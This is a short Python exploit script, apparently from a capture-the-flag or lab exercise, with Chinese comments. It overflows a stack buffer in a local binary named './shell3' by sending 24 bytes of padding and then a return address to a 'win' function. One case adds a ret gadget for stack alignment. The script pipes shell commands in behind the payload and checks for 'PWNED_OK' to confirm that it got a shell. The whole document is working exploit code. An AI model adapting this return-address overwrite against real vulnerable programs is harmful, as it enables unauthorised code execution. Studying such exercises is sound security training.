import struct, subprocess

WIN = 0x4011d6
RET = 0x40101a

def p64(x):
    return struct.pack("<Q", x)

cases = [
    ("A 直接跳 win（不对齐）", b"A" * 24 + p64(WIN)),
    ("B 先过一个 ret 再跳 win", b"A" * 24 + p64(RET) + p64(WIN)),
]

for name, core in cases:
    payload = core.ljust(64, b"C")          # read() 只吃 64 字节，后面留给 /bin/sh
    print("=" * 46)
    print(name, "| payload =", len(payload), "字节")
    r = subprocess.run(["./shell3"], input=payload + b"echo PWNED_OK\nexit\n",
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
    out = r.stdout.decode("utf-8", "replace")
    print("returncode =", r.returncode)
    print("命中命令 =", "PWNED_OK" in out)
    print(out.strip()[:300])
